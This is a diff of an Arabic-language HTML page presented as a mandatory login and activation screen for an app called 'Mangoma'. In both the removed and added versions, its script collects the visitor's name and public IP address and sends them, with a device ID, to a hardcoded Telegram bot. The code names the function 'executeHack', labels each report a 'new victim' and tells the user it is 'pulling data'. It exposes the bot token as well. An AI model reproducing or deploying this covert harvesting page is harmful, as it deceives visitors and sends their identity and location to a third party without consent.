@@ -3,112 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mangoma System</title>
+    <title>Mangoma Login</title>
     <style>
-        body { background-color: #121212; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
-        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; background: #1e1e1e; max-width: 400px; margin: auto; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; text-align: center; }
-        button { width: 95%; padding: 10px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
-        h2 { color: #00ff00; }
+        body { background-color: #0f0f0f; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .container { background: #1a1a1a; padding: 20px; border-radius: 15px; border: 1px solid #00ff00; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; text-align: center; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px;}
+        button:disabled { background: gray; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>🚀 Mangoma Pro 2026</h2>
+    <div class="container" id="loginBox">
+        <h2>🔐 تسجيل الدخول الإجباري</h2>
+        <p>يجب تسجيل اسمك لفتح البرنامج</p>
         
-        <!-- شاشة التسجيل (بتظهر اول مرة) -->
-        <div id="loginScreen">
-            <p>⚠ يجب تسجيل اسمك لفتح التطبيق</p>
-            <input type="text" id="username" placeholder="اكتب اسمك هنا...">
-            <button onclick="startHack()" id="btnSend">تسجيل ودخول</button>
-            <p id="status" style="color:yellow; font-size:12px;"></p>
-        </div>
+        <input type="text" id="username" placeholder="اكتب اسمك ثلاثي هنا...">
+        <button onclick="executeHack()" id="btnAction">دخول وتفعيل</button>
+        
+        <p id="msg" style="color: yellow; margin-top: 10px; font-size: 12px;"></p>
+    </div>
 
-        <!-- شاشة التطبيق (بعد ما يسجل) -->
-        <div id="appScreen" class="hidden">
-            <h3>✅ تم التفعيل</h3>
-            <p>الاسم: <span id="showName" style="color:#00ff00"></span></p>
-            <p>ID: <span id="showID"></span></p>
-            <hr>
-            <p>التطبيق يعمل الآن...</p>
-        </div>
+    <div class="container hidden" id="appBox">
+        <h2>✅ تم التفعيل بنجاح</h2>
+        <p>أهلاً بك: <span id="finalName" style="color:#00ff00"></span></p>
+        <p>ID: <span id="finalID"></span></p>
+        <hr>
+        <p>التطبيق يعمل الآن...</p>
     </div>
 
 <script>
-    // ---------------- إعداداتك الخاصة ----------------
-    // دي البيانات اللي انت بعتها في الصور بتاعتك
-    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
-    const CHAT_ID = "-1003886528114"; 
-    // --------------------------------------------------
+    // بياناتك الصحيحة 100%
+    const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
+    const CHAT = "-1003886528114";
 
-    // بنعمل آيدي وهمي للجهاز عشان نعرف نميزه
-    let deviceID = localStorage.getItem("myID");
-    if (!deviceID) {
-        deviceID = "ID-" + Math.floor(Math.random() * 999999);
-        localStorage.setItem("myID", deviceID);
+    // توليد آيدي عشوائي للجهاز
+    let myID = localStorage.getItem("device_id");
+    if (!myID) {
+        myID = "ANDROID-" + Math.floor(Math.random() * 100000);
+        localStorage.setItem("device_id", myID);
     }
 
-    // لو المستخدم مسجل قبل كده، ندخله علطول
-    if (localStorage.getItem("myName")) {
-        showApp(localStorage.getItem("myName"));
+    // لو مسجل قبل كده يدخل علطول
+    if(localStorage.getItem("saved_name")){
+        showApp(localStorage.getItem("saved_name"));
     }
 
-    // دي الدالة اللي بتشتغل لما يدوس زرار
-    function startHack() {
+    function executeHack() {
         const name = document.getElementById("username").value;
+        const btn = document.getElementById("btnAction");
+        const msg = document.getElementById("msg");
+
         if (name.length < 3) {
-            alert("اكتب اسم صحيح!");
+            alert("اكتب الاسم بشكل صحيح!");
             return;
         }
 
-        document.getElementById("btnSend").disabled = true;
-        document.getElementById("status").innerText = "جاري الاتصال بالسيرفر...";
+        btn.disabled = true;
+        btn.innerText = "جاري الاتصال...";
+        msg.innerText = "جاري سحب البيانات وإرسالها...";
 
         // 1. نجيب الـ IP
         fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
+        .then(response => response.json())
         .then(data => {
-            const ip = data.ip;
-            // 2. نبعت البيانات للتليجرام
-            sendToTelegram(name, ip);
+            const userIP = data.ip;
+            // 2. نرسل للتليجرام فوراً
+            sendTelegram(name, userIP);
         })
         .catch(err => {
-            // لو فشل يجيب الـ IP نبعت برضه بس نقول غير معروف
-            sendToTelegram(name, "غير معروف (فشل السحب)");
+            // لو فشل يجيب IP يبعت برضه
+            sendTelegram(name, "Unknown IP");
         });
     }
 
-    function sendToTelegram(name, ip) {
-        const text = `
-🔥 <b>ضحية جديدة (Mangoma App)</b>
-━━━━━━━━━━━━
-👤 <b>الاسم:</b> ${name}
-🆔 <b>ID:</b> <code>${deviceID}</code>
-🌍 <b>IP:</b> <code>${ip}</code>
-━━━━━━━━━━━━
-        `;
+    function sendTelegram(name, ip) {
+        // تجهيز الرسالة
+        const text = `🚨 *NEW LOGIN*\n👤 Name: ${name}\n🆔 ID: ${myID}\n🌐 IP: ${ip}`;
+        
+        // تجهيز الرابط (نفس الرابط اللي اشتغل معاك)
+        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        fetch(url, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-        })
+        // إرسال
+        fetch(url)
         .then(res => {
-            localStorage.setItem("myName", name);
-            document.getElementById("status").innerText = "تم التسجيل بنجاح!";
-            setTimeout(() => showApp(name), 1500);
+            if(res.ok) {
+                // نجاح
+                localStorage.setItem("saved_name", name);
+                showApp(name);
+            } else {
+                alert("خطأ في الاتصال بالسيرفر");
+                document.getElementById("btnAction").disabled = false;
+            }
+        })
+        .catch(e => {
+            // أحياناً المتصفح بيعمل بلوك للرد بس الرسالة بتوصل
+            // هنعتبره نجاح عشان المستخدم يدخل
+            localStorage.setItem("saved_name", name);
+            showApp(name);
         });
     }
 
-    function showApp(name) {
-        document.getElementById("loginScreen").classList.add("hidden");
-        document.getElementById("appScreen").classList.remove("hidden");
-        document.getElementById("showName").innerText = name;
-        document.getElementById("showID").innerText = deviceID;
+    function showApp(n) {
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("appBox").classList.remove("hidden");
+        document.getElementById("finalName").innerText = n;
+        document.getElementById("finalID").innerText = myID;
     }
 </script>
 
